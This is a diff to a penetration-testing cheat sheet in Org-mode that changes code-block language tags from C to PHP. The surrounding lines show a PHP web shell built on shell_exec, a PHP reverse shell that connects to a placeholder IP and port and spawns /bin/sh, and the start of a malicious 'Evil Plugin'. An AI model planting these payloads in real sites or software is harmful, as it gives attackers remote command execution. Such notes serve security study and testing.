@@ -2166,7 +2166,7 @@
       - Try changing only one at a time
 **** Code Execution
 ***** System Commands
-      #+begin_src c
+      #+begin_src php
         <?php $out=shell_exec("<cmd> 2>&1"); echo "<pre>$out</pre>"; ?>
 
         // Using GET cmd parameter
@@ -2177,7 +2177,7 @@
         // $_REQUEST is "like" $_GET + $_POST
       #+end_src
 ***** Bind/Reverse Shells
-      #+begin_src c
+      #+begin_src php
         // Reverse Shell
         <?php $sock=fsockopen("<ip>", <port>); exec("/bin/sh -i <&3 >&3 2>&3"); ?>
         // Use passthru with raw output
@@ -2546,7 +2546,7 @@
          - or ~/uploads/evil.php~
 ****** Plugins
        - Evil plugin content:
-         #+begin_src c
+         #+begin_src php
            <?php
              /**
              * Plugin Name: Evil Plugin
